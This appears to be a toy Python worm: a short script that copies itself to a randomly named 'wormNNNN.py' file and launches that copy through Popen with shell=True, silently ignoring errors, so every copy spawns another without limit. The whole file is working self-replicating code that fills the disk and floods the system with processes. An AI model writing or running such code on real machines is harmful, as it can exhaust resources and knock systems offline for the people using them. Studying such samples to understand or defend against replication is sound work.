from subprocess import Popen
from shutil import copy
from random import seed, randint

# Initialise random library
seed()

# # Adopt worm1.py name
# copy(__file__, "../")


try:
    # Create a version of itself
    file_name = "worm"+str(randint(2, 5000))+".py"
    copy(__file__, file_name)
    Popen((file_name), shell=True)
except:
    pass
